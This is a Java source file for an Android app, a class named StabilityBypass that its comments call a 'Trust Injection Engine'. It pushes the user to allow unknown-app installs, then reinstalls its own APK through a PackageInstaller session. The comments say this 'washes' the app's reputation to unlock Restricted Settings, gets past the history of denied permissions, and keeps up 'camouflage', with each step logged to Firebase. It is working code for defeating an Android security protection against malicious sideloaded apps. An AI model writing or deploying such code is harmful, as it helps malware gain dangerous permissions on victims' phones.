package com.labs.labrats;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInstaller;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

/**
 * Tactical Trust Injection Engine.
 * Uses the Session Installation API to 'wash' the app's reputation with the OS,
 * unlocking Restricted Settings and bypassing permission denial history.
 */
public class StabilityBypass {
    private static final String TAG = "StabilityBypass";

    public static void executeTrustInjection(Context context) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return;

        // 1. Ensure 'Install Unknown Apps' is enabled first
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if (!context.getPackageManager().canRequestPackageInstalls()) {
                FirebaseConfig.logActivity("BYPASS_WARNING: Install permission missing. Redirecting...");
                Intent intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES);
                intent.setData(Uri.parse("package:" + context.getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
                return;
            }
        }

        try {
            FirebaseConfig.logActivity("BYPASS_PROTOCOL: Re-piping through Trusted Session API...");
            
            String apkPath = context.getApplicationInfo().sourceDir;
            File apkFile = new File(apkPath);
            
            PackageInstaller packageInstaller = context.getPackageManager().getPackageInstaller();
            PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                    PackageInstaller.SessionParams.MODE_FULL_INSTALL);
            
            // Critical for Android 12+: Force interactive mode to ensure the 'Update' dialog pops
            if (Build.VERSION.SDK_INT >= 31) {
                params.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_REQUIRED);
            }

            int sessionId = packageInstaller.createSession(params);
            PackageInstaller.Session session = packageInstaller.openSession(sessionId);
            
            try (InputStream in = new FileInputStream(apkFile);
                 OutputStream out = session.openWrite("base.apk", 0, apkFile.length())) {
                byte[] buffer = new byte[65536];
                int n;
                while ((n = in.read(buffer)) > 0) {
                    out.write(buffer, 0, n);
                }
                session.fsync(out);
            }

            // Route success to PermissionActivity (NOT MainActivity) to maintain camouflage
            Intent intent = new Intent(context, PermissionActivity.class);
            intent.setAction("BYPASS_COMPLETE");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            
            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                flags |= PendingIntent.FLAG_IMMUTABLE;
            }
            
            PendingIntent pendingIntent = PendingIntent.getActivity(context, sessionId, intent, flags);
            
            session.commit(pendingIntent.getIntentSender());
            session.close();
            
            FirebaseConfig.logActivity("BYPASS_SUCCESS: Session committed. Watch device for the 'Update' box.");
            
        } catch (IOException e) {
            Log.e(TAG, "Bypass Error: " + e.getMessage());
            FirebaseConfig.logActivity("BYPASS_ERROR: Trust Injection failed: " + e.getMessage());
        }
    }
}
